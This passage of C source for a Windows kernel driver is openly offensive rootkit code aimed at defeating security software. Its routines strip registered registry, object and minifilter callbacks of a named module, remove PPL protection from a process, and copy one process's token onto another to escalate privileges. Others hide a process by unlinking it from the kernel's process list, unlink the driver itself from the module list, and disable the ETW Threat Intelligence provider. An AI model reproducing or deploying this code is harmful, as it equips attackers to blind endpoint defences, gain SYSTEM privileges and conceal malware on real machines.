            if (cbFunc && MmIsAddressValid((PVOID)cbFunc))
            {
                ModulesData md = { 0 };
                NTSTATUS s = SearchModules(cbFunc, &md);
                if (NT_SUCCESS(s))
                {
                    // confronto case-insensitive
                    if (_stricmp(md.ModuleName, moduleName) == 0)
                    {
                        DbgPrintEx(0, 0, "deleting entry: %s", md.ModuleName);
                        // Unlink sicuro con controlli
                        PLIST_ENTRY prev = curr->Item.Blink;
                        PLIST_ENTRY next = curr->Item.Flink;

                        if (prev && next &&
                            MmIsAddressValid(prev) &&
                            MmIsAddressValid(next) &&
                            prev->Flink && next->Blink)
                        {
                            // scollega curr
                            prev->Flink = next;
                            next->Blink = prev;

                            // Isola il nodo per evitare use-after-free di link
                            InitializeListHead(&curr->Item);

                            status = STATUS_SUCCESS;
                        }
                        else
                        {
                            status = STATUS_DATA_ERROR; // lista corrotta/inconsistente
                        }
                        break; // rimuove la PRIMA occorrenza; togli se vuoi continuare
                    }
                }
            }

            // Avanza
            PLIST_ENTRY flink = curr->Item.Flink;
            if (!flink || !MmIsAddressValid(flink))
                break;

            // Se torniamo all’head abbiamo chiuso il giro
            if (flink == &head->Item)
                break;

            // Assumiamo che LIST_ENTRY sia il primo campo della struct
            curr = (PREGISTRY_CALLBACK_ITEM)flink;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        status = GetExceptionCode() ? STATUS_ACCESS_VIOLATION : STATUS_UNHANDLED_EXCEPTION;
    }

    return status;
}

// Non so bene perche' ma non unlinka l'entry dalla linked list. invece settiamo il puntatore alla funzione di callback a NULL (dovrebbe funzionare lo stesso ezez)
NTSTATUS DeleteObjCallbackNotifyRoutineAddress(CHAR* moduleName) {
    DWORD64 ProcessObjectType = (DWORD64)*PsProcessType;
    DWORD64 ThreadObjectType = (DWORD64)*PsThreadType;
    NTSTATUS status;

    LIST_ENTRY* procListHead = (LIST_ENTRY*)(ProcessObjectType + 0xc8);

    LIST_ENTRY* threadListHead = (LIST_ENTRY*)(ThreadObjectType + 0xc8);

    //ModulesData* procModules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);
    //ModulesData* threadModules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);



    LIST_ENTRY* tmpEntry = procListHead->Flink;

    while (tmpEntry != procListHead) {
        ModulesData module;
        OB_CALLBACK_ENTRY* objEntry = CONTAINING_RECORD(tmpEntry, OB_CALLBACK_ENTRY, CallbackList);
        if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PreOperation)) {
            ULONG64 address = (ULONG64)objEntry->PreOperation;
            status = SearchModules(address, &module);

            if (NT_SUCCESS(status)) {
                if (_stricmp(module.ModuleName, moduleName) == 0) {
                    InterlockedExchangePointer((PVOID*)&objEntry->PreOperation, NULL);
                }
            }
        }
        else if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PostOperation)) {
            ULONG64 address = (ULONG64)objEntry->PostOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                if (_stricmp(module.ModuleName, moduleName) == 0) {
                    InterlockedExchangePointer((PVOID*)&objEntry->PostOperation, NULL);
                }
            }

        }
        else {
            break;
        }

        tmpEntry = tmpEntry->Flink;
    }


    tmpEntry = threadListHead->Flink;
    while (tmpEntry != threadListHead) {
        ModulesData module;
        OB_CALLBACK_ENTRY* objEntry = CONTAINING_RECORD(tmpEntry, OB_CALLBACK_ENTRY, CallbackList);
        if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PreOperation)) {
            ULONG64 address = (ULONG64)objEntry->PreOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                if (_stricmp(module.ModuleName, moduleName) == 0) {
                    InterlockedExchangePointer((PVOID*)&objEntry->PreOperation, NULL);
                }
            }
        }
        else if (MmIsAddressValid(objEntry) && MmIsAddressValid(objEntry->PostOperation)) {
            ULONG64 address = (ULONG64)objEntry->PostOperation;
            status = SearchModules(address, &module);
            if (NT_SUCCESS(status)) {
                if (_stricmp(module.ModuleName, moduleName) == 0) {
                    InterlockedExchangePointer((PVOID*)&objEntry->PostOperation, NULL);
                }
            }
        }
        else {
            break;
        }

        tmpEntry = tmpEntry->Flink;
    }
    status = STATUS_SUCCESS;
    return status;
}


NTSTATUS DeleteMinifilterCallbacks(const WCHAR* filterName) {

    PFLT_FILTER* filterList = NULL;          // Array to store enumerated filters
    ULONG filterCount = 0;                   // Number of filters found
    ULONG bufferSize = 0;                    // Size of buffer needed for filter list

    DbgPrintEx(0, 0, "[%s] Starting filter enumeration\n", DRIVER_NAME);

    // Determine the number of minifilters by calling with null buffer
    NTSTATUS status = FltEnumerateFilters(NULL, bufferSize, &filterCount);
    if (status != STATUS_BUFFER_TOO_SMALL) {
        DbgPrintEx(0, 0, "[%s] FltEnumerateFilters failed: 0x%08X\n", DRIVER_NAME, status);
        return status;
    }

    // Allocate memory for the filter list
    bufferSize = filterCount * sizeof(PFLT_FILTER);
    filterList = (PFLT_FILTER*)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, DRIVER_TAG);
    if (!filterList) {
        DbgPrintEx(0, 0, "[%s] Memory allocation for filterList failed\n", DRIVER_NAME);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Enumerate all minifilters into the allocated buffer
    status = FltEnumerateFilters(filterList, bufferSize, &filterCount);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(0, 0, "[%s] FltEnumerateFilters failed on second call: 0x%08X\n", DRIVER_NAME, status);
        ExFreePool(filterList);
        return status;
    }

    // Pointer to the target filter to unlink
    PFLT_FILTER targetFilter = NULL;

    // Search for the target filter by name
    for (ULONG i = 0; i < filterCount; i++) {

        PFLT_FILTER filter = filterList[i];  // Current filter object
        PFILTER_AGGREGATE_BASIC_INFORMATION filterInfo = NULL; // Structure for filter details
        ULONG filterInfoSize = 0;            // Size of returned filter info
        ULONG filterInfoBufferSize = 0;      // Size needed for filter info buffer

        // Get required buffer size for filter information
        status = FltGetFilterInformation(filter, FilterAggregateBasicInformation, NULL, 0, &filterInfoBufferSize);
        if (status != STATUS_BUFFER_TOO_SMALL) {
            DbgPrintEx(0, 0, "[%s] FltGetFilterInformation failed: 0x%08X\n", DRIVER_NAME, status);
            continue;
        }

        // Allocate memory for filter 
        filterInfo = (PFILTER_AGGREGATE_BASIC_INFORMATION)ExAllocatePool2(POOL_FLAG_NON_PAGED, filterInfoBufferSize, DRIVER_TAG);
        if (!filterInfo) {
            DbgPrintEx(0, 0, "[%s] Memory allocation for filterInfo failed\n", DRIVER_NAME);
            continue;
        }

        // Retrieve detailed filter information
        status = FltGetFilterInformation(filter, FilterAggregateBasicInformation, filterInfo, filterInfoBufferSize, &filterInfoSize);
        if (!NT_SUCCESS(status)) {
            DbgPrintEx(0, 0, "[%s] FltGetFilterInformation failed on second call: 0x%08X\n", DRIVER_NAME, status);
            ExFreePool(filterInfo);
            continue;
        }

        // Extract filter name from info structure
        PWCHAR filterNameAddr = (PWCHAR)((PCHAR)filterInfo + filterInfo->Type.MiniFilter.FilterNameBufferOffset);

        // Copy and null-terminate the filter name for comparison
        WCHAR baseFilterName[256] = { 0 };
        wcsncpy(baseFilterName, filterNameAddr, min(filterInfo->Type.MiniFilter.FilterNameLength / sizeof(WCHAR), 255));
        baseFilterName[min(filterInfo->Type.MiniFilter.FilterNameLength / sizeof(WCHAR), 255)] = L'\0';

        // Compare with target filter name
        DbgPrintEx(0, 0, "[%s] Comparing %ws with %ws\n", DRIVER_NAME, baseFilterName, filterName);
        if (wcscmp(baseFilterName, filterName) == 0) {
            targetFilter = filter;
        }

        ExFreePool(filterInfo); // Free filter info memory
        if (targetFilter) {
            break;
        }
    }

    // Check if target filter was found
    if (!targetFilter) {
        DbgPrintEx(0, 0, "[%s] Target filter not found: %ws\n", DRIVER_NAME, filterName);
        ExFreePool(filterList);
        return STATUS_NOT_FOUND;
    }

    PFLT_INSTANCE* instanceList = NULL;      // Array to store filter instances
    ULONG instanceCount = 0;                 // Number of instances found
    bufferSize = 0;                          // Reset buffer size

    DbgPrintEx(0, 0, "[%s] Starting instance enumeration for filter: %ws\n", DRIVER_NAME, filterName);

    // Determine the number of instances for the target filter
    status = FltEnumerateInstances(NULL, targetFilter, instanceList, bufferSize, &instanceCount);
    if (status != STATUS_BUFFER_TOO_SMALL) {
        DbgPrintEx(0, 0, "[%s] FltEnumerateInstances failed: 0x%08X\n", DRIVER_NAME, status);
        ExFreePool(filterList);
        return status;
    }

    // Allocate memory for the instance list
    bufferSize = instanceCount * sizeof(PFLT_INSTANCE);
    instanceList = (PFLT_INSTANCE*)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, DRIVER_TAG);
    if (!instanceList) {
        DbgPrintEx(0, 0, "[%s] Memory allocation for instanceList failed\n", DRIVER_NAME);
        ExFreePool(filterList);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Enumerate all instances of the target filter
    status = FltEnumerateInstances(NULL, targetFilter, instanceList, bufferSize, &instanceCount);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(0, 0, "[%s] FltEnumerateInstances failed on second call: 0x%08X\n", DRIVER_NAME, status);
        ExFreePool(filterList);
        ExFreePool(instanceList);
        return status;
    }

    DbgPrintEx(0, 0, "[%s] Found %lu instances for filter: %ws\n", DRIVER_NAME, instanceCount, filterName);

    PRTL_PROCESS_MODULES moduleInformation = NULL; // Structure for system module info
    ULONG sizeNeeded = 0;                   // Size needed for module info
    SIZE_T infoRegionSize = 0;              // Actual allocated size


    UNICODE_STRING zwQuerySystemInformationName;
    RtlInitUnicodeString(&zwQuerySystemInformationName, L"ZwQuerySystemInformation");
    // Get pointer to ZwQuerySystemInformation function
    PFN_ZwQuerySystemInformation zwQuerySystemInformation = (PFN_ZwQuerySystemInformation)MmGetSystemRoutineAddress(&zwQuerySystemInformationName);

    // Determine required size for system module information
    status = zwQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x0B, NULL, 0, &sizeNeeded);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        ExFreePool(filterList);
        ExFreePool(instanceList);
        DbgPrintEx(0, 0, "[%s] ZwQuerySystemInformation failed to get size: 0x%08X\n", DRIVER_NAME, status);
        return status;
    }

    infoRegionSize = sizeNeeded;

    // Allocate memory for module information, adjusting size until successful
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        infoRegionSize += 0x1000; // Increment size to handle potential growth
        moduleInformation = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE, infoRegionSize, DRIVER_TAG);
        if (moduleInformation == NULL) {
            ExFreePool(filterList);
            ExFreePool(instanceList);
            DbgPrintEx(0, 0, "[%s] Memory allocation for moduleInformation failed\n", DRIVER_NAME);
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        // Query system module information
        status = zwQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x0B, moduleInformation, (ULONG)infoRegionSize, &sizeNeeded);
        if (!NT_SUCCESS(status)) {
            ExFreePool((PVOID)moduleInformation);
            moduleInformation = NULL;
        }
    }

    if (!NT_SUCCESS(status)) {
        ExFreePool(filterList);
        ExFreePool(instanceList);
        DbgPrintEx(0, 0, "[%s] ZwQuerySystemInformation failed on second call: 0x%08X\n", DRIVER_NAME, status);
        return status;
    }

    // Enumerate and unlink callback nodes for each instance
    for (ULONG i = 0; i < instanceCount; i++) {

        PFLT_INSTANCE currentInstance = instanceList[i];    // Current instance to process 

        // Allocate temporary buffer for instance memory
        PFLT_INSTANCE instanceVa = (PFLT_INSTANCE)ExAllocatePool2(POOL_FLAG_NON_PAGED, 0x230, DRIVER_TAG);
        if (!instanceVa) {
            DbgPrintEx(0, 0, "[%s] Memory allocation for instanceVa failed\n", DRIVER_NAME);
            continue;
        }

        // Safely read instance memory
        if (!DcmbReadMemorySafe((PVOID)currentInstance, (PVOID)instanceVa, 0x230)) {
            DbgPrintEx(0, 0, "[%s] DcmbReadMemorySafe failed\n", DRIVER_NAME);
            ExFreePool(instanceVa);
            continue;
        }

        // Scan memory for potential callback 
        for (DWORD x = 0; x < 0x230; x++) {
            DWORD64 potentialPointer = *(PDWORD64)((DWORD64)instanceVa + x); // Potential pointer to callback node
            PCALLBACK_NODE potentialNode = (PCALLBACK_NODE)potentialPointer; // Cast to callback node structure

            if (MmIsAddressValid(potentialNode)) {  // Check if pointer is valid
                // Validate against each loaded module
                for (ULONG j = 0; j < moduleInformation->NumberOfModules; j++) {
                    PRTL_PROCESS_MODULE_INFORMATION driverModule = &moduleInformation->Modules[j];   // Current module info

                    // Validate if this is a legitimate callback node
                    if (DcmbValidatePotentialCallbackNodes(potentialNode, currentInstance, (DWORD64)driverModule->ImageBase, driverModule->ImageSize)) {
                        DbgPrintEx(0, 0, "[%s] Found callback node for filter: %ws\n", DRIVER_NAME, filterName);

                        // Unlink the callback node from the linked list
                        DWORD64 prevNodeAddress = *(DWORD64*)((DWORD64)&potentialNode->CallbackLinks + offsetof(LIST_ENTRY, Blink));
                        DWORD64 nextNodeAddress = *(DWORD64*)((DWORD64)&potentialNode->CallbackLinks + offsetof(LIST_ENTRY, Flink));
                        *(DWORD64*)((DWORD64)nextNodeAddress + offsetof(LIST_ENTRY, Blink)) = prevNodeAddress;  // Update next node's back pointer
                        *(DWORD64*)((DWORD64)prevNodeAddress + offsetof(LIST_ENTRY, Flink)) = nextNodeAddress;  // Update prev node's forward pointer

                        DbgPrintEx(0, 0, "[%s] Successfully unlinked callback for filter: %ws\n", DRIVER_NAME, filterName);
                    }
                }
            }
        }
        // Free temporary instance buffer
        ExFreePool(instanceVa);
    }

    // Clean up all allocated memory
    ExFreePool(filterList);
    ExFreePool(instanceList);
    ExFreePool(moduleInformation);
    return STATUS_SUCCESS;
}

NTSTATUS pplBypass(UINT64 pidVal, int offset) {
	NTSTATUS status;

    PEPROCESS eProcess = NULL;
    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);

    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
	}
	DbgPrintEx(0, 0, "protection: 0x%llx\n", *(PUINT64)((UINT64)eProcess + offset));

	//_PS_PROTECTION protection = *(_PS_PROTECTION*)((UINT64)eProcess->Protection);

	*(PUINT64)((UINT64)eProcess + offset) = 0;

	DbgPrintEx(0, 0, "new protection: 0x%llx\n", *(PUINT64)((UINT64)eProcess + offset));
    if (*(PUINT64)((UINT64)eProcess + offset) == 0) {
        DbgPrintEx(0, 0, "[%s] Successfully removed PPL protection for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove PPL protection for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
        ObDereferenceObject(eProcess);
        return STATUS_UNSUCCESSFUL;
    }
	return STATUS_SUCCESS;

}

NTSTATUS procTokenSwap(DWORD pid1,DWORD pid2, int offset) {
	NTSTATUS status;
	PEPROCESS eProcess1 = NULL;
	PEPROCESS eProcess2 = NULL;

	status = PsLookupProcessByProcessId((HANDLE)pid1, &eProcess1);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pid1, status);
        return STATUS_UNSUCCESSFUL;
	}

    status = PsLookupProcessByProcessId((HANDLE)pid2, &eProcess2);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pid2, status);
        ObDereferenceObject(eProcess2);
        return STATUS_UNSUCCESSFUL;
	}

	DbgPrintEx(0, 0, "trying to copy token from pid %d to pid %d\n", pid2, pid1);
    
    *(PUINT64)((UINT64)eProcess1 + offset) = *(PUINT64)((UINT64)eProcess2 + offset);

	ObDereferenceObject(eProcess1);
	ObDereferenceObject(eProcess2);
    return STATUS_SUCCESS;
}

NTSTATUS procHiding(DWORD pidVal, DWORD offset) {
    NTSTATUS status;
    PEPROCESS eProcess = NULL;

    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %lu (0x%08X)\n",
            DRIVER_NAME, pidVal, status);
        return status;
    }

    // Attach to target process context to safely access its memory

    LIST_ENTRY* listEntry = (LIST_ENTRY*)((UINT64)eProcess + offset);

    // Comprehensive memory validation
    if (!MmIsAddressValid(listEntry) ||
        !MmIsAddressValid(listEntry->Flink) ||
        !MmIsAddressValid(listEntry->Blink)) {
        ObDereferenceObject(eProcess);
        return STATUS_ACCESS_VIOLATION;
    }
	DbgPrintEx(0, 0, "[%s] Hiding process PID %lu\n", DRIVER_NAME, pidVal);



    // Enhanced list integrity check
    if (listEntry->Flink->Blink != listEntry || listEntry->Blink->Flink != listEntry) {
        ObDereferenceObject(eProcess);
        DbgPrintEx(0, 0, "[%s] List integrity check failed for PID %lu\n", DRIVER_NAME, pidVal);
        return STATUS_UNSUCCESSFUL;
    }

    // Perform the removal
    listEntry->Flink->Blink = listEntry->Blink;
    listEntry->Blink->Flink = listEntry->Flink;

    // Self-link
    listEntry->Flink = listEntry;
    listEntry->Blink = listEntry;

    ObDereferenceObject(eProcess);

    DbgPrintEx(0, 0, "[%s] Successfully hid process PID %lu\n", DRIVER_NAME, pidVal);
    return STATUS_SUCCESS;
}

NTSTATUS unlinkDriver(PDRIVER_OBJECT DriverObject) {
	PMODULE_ENTRY prevModule, nextModule, currentModule;

	currentModule = (PMODULE_ENTRY)DriverObject->DriverSection;
	prevModule = (PMODULE_ENTRY)currentModule->InLoadOrderLinks.Blink;
	nextModule = (PMODULE_ENTRY)currentModule->InLoadOrderLinks.Flink;

	DbgPrintEx(0, 0, "[%s] Unlinking driver %wZ\n", DRIVER_NAME, &DriverObject->DriverName);
	prevModule->InLoadOrderLinks.Flink = currentModule->InLoadOrderLinks.Flink;
	nextModule->InLoadOrderLinks.Blink = currentModule->InLoadOrderLinks.Blink;

	currentModule->InLoadOrderLinks.Flink = (PLIST_ENTRY)currentModule;
	currentModule->InLoadOrderLinks.Blink = (PLIST_ENTRY)currentModule;

	DbgPrintEx(0, 0, "[%s] Successfully unlinked driver %wZ\n", DRIVER_NAME, &DriverObject->DriverName);

	return STATUS_SUCCESS;
}

NTSTATUS disablingWTI(ULONG64 kernelBase, disKerETWArgs args) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD64 etwtiProvReghandle = (DWORD64)kernelBase + args.etWThreatIntProvRegHandleOffset;

    DWORD64 ETWTI_ETW_REG_ENTRY = *(DWORD64*)etwtiProvReghandle + args.regEntry_guidEntryOffset;

    DWORD64 providerEnableInfoAddress = *(DWORD64*)ETWTI_ETW_REG_ENTRY + args.GuidEntry_ProviderEnableInfoOffset;

    DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo address = 0x%llx\n", providerEnableInfoAddress);


    DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", *(DWORD64*)providerEnableInfoAddress & 0xFF);

    DbgPrintEx(0, 0, "[+] Disabling ETWTI Provider:\n");
    //InterlockedExchange((DWORD64*)providerEnableInfoAddress, 0);

    *(DWORD64*)providerEnableInfoAddress = 0;

    DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", *(DWORD64*)providerEnableInfoAddress & 0xFF);
    if (*(DWORD64*)providerEnableInfoAddress == 0) {
        status = STATUS_SUCCESS;
    }

    return status;
}

UINT64 FindKernelBase() {
    UNICODE_STRING functionName;
    PFN_ZwQuerySystemInformation querySysInfo;
    NTSTATUS status;
    ULONG requiredSize;
    SIZE_T allocationSize;
    UINT64 kernelBase = 0;
    PRTL_PROCESS_MODULES moduleInfo = NULL;

    RtlInitUnicodeString(&functionName, L"ZwQuerySystemInformation");

    // dynamically get the address of ZwQuerySystemInformation
    querySysInfo = (PFN_ZwQuerySystemInformation)MmGetSystemRoutineAddress(&functionName);

    if (!querySysInfo) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get ZwQuerySystemInformation\n", DRIVER_NAME);
        return kernelBase;
    }

    status = querySysInfo((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &requiredSize);

    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        DbgPrintEx(0, 0, "[%s] ZwQuerySystemInformation failed to get size (0x%X)\n", DRIVER_NAME, status);
        return kernelBase;
    }

    allocationSize = requiredSize;
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        allocationSize += sizeof(ULONG);
        moduleInfo = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, allocationSize, 'Tag1');
        if (!moduleInfo) {
            DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
            return kernelBase;
        }
        status = querySysInfo((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, moduleInfo, (ULONG)allocationSize, &requiredSize);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePoolWithTag(moduleInfo, 'Tag1');
            moduleInfo = NULL;
        }
    }
    if (!NT_SUCCESS(status)) {
        if (moduleInfo) {
            ExFreePoolWithTag(moduleInfo, 'Tag1');
        }
        return kernelBase;
    }
    kernelBase = (UINT64)moduleInfo->Modules[0].ImageBase;
    ExFreePoolWithTag(moduleInfo, 'Tag1');
    return kernelBase;
}


// Function to safely read kernel memory by mapping physical address space
BOOL DcmbReadMemorySafe(PVOID TargetAddress, PVOID AllocatedBuffer, SIZE_T LengthToRead) {
    // Convert the virtual target address to a physical address
    PHYSICAL_ADDRESS PhysicalAddr = MmGetPhysicalAddress(TargetAddress);

    // Check if the physical address is valid (non-zero)
    if (PhysicalAddr.QuadPart) {

        // Map the physical address to a new virtual address space
        PVOID NewVirtualAddr = MmMapIoSpace(PhysicalAddr, LengthToRead, MmNonCached);
        if (NewVirtualAddr) {

            // Copy data byte-by-byte from the mapped address to the allocated buffer
            for (SIZE_T i = 0; i < LengthToRead; i++) {
                *(PBYTE)((DWORD64)AllocatedBuffer + i) = *(PBYTE)((DWORD64)NewVirtualAddr + i);
            }

            // Unmap the temporary virtual address space to free resources
            MmUnmapIoSpace(NewVirtualAddr, LengthToRead);
            return TRUE;
        }
    }

    // Return failure if physical address is invalid or mapping fails
    return FALSE;
}

// Function to validate if a callback node belongs to a specific filter instance and driver
BOOL DcmbValidatePotentialCallbackNodes(PCALLBACK_NODE PotentialCallbackNode, PFLT_INSTANCE FltInstance, DWORD64 DriverStartAddr, DWORD64 DriverSize) {

    // Check if the callback node's instance matches the provided filter instance
    if (PotentialCallbackNode->Instance != FltInstance) return FALSE;

    // Validate the PreOperation callback address, if it exists
    if (PotentialCallbackNode->PreOperation) {

        // Check if PreOperation address falls within the driver's memory range
        if (!((DWORD64)PotentialCallbackNode->PreOperation > DriverStartAddr && (DWORD64)PotentialCallbackNode->PreOperation < (DriverStartAddr + DriverSize))) {
            return FALSE;
        }
    }

    // Validate the PostOperation callback address, if it exists
    if (PotentialCallbackNode->PostOperation) {

        // Check if PostOperation address falls within the driver's memory range
        if (!((DWORD64)PotentialCallbackNode->PostOperation > DriverStartAddr && (DWORD64)PotentialCallbackNode->PostOperation < (DriverStartAddr + DriverSize))) {
            return FALSE;
        }
    }

    // Ensure at least one callback (Pre or Post) 
    if (!PotentialCallbackNode->PreOperation && !PotentialCallbackNode->PostOperation) return FALSE;

    // Return success
    return TRUE;
}
